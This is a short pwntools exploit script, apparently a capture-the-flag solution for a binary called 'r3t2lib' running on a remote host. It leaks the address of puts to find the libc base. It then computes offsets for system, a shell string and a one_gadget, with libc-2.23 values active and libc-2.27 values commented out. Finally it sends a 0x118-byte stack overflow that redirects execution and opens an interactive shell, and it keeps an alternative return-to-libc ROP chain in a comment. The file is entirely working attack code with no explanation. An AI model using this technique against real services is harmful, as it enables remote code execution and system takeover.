from pwn import *

puts_plt = 0x601018
'''
# libc-2.27
system_offset = 0x4f440
puts_offset = 0x809c0
shell_offset = 0x7f20b9352e9a - 0x00007f20b919f000
one_gadget_offset = 0x4f2c5 
'''
# libc-2.23
system_offset = 0x45390
puts_offset = 0x6f690
shell_offset = 0x7febc0c57d57 - 0x7febc0acb000
one_gadget_offset = 0x45216

pop_rdi = 0x400843
ret = 0x400539

r = remote('140.110.112.77', 2123)
#r = process('r3t2lib')
raw_input('debug')
r.recvuntil('hex) :')
r.sendline(hex(puts_plt))
puts_libc = int(r.recvline().strip().split(':')[1].strip()[2:], 16)
print('puts_libc: ', hex(puts_libc))
base_libc = puts_libc - puts_offset
print(hex(base_libc))
system_libc = base_libc + system_offset
shell_libc = base_libc + shell_offset 
one_gadget = base_libc + one_gadget_offset

r.recvuntil('me :')
r.sendline('a' * 0x118 + p64(one_gadget))
#r.sendline('a' * 0x118 + p64(ret) + p64(pop_rdi) + p64(shell_libc) + p64(system_libc))
r.interactive()
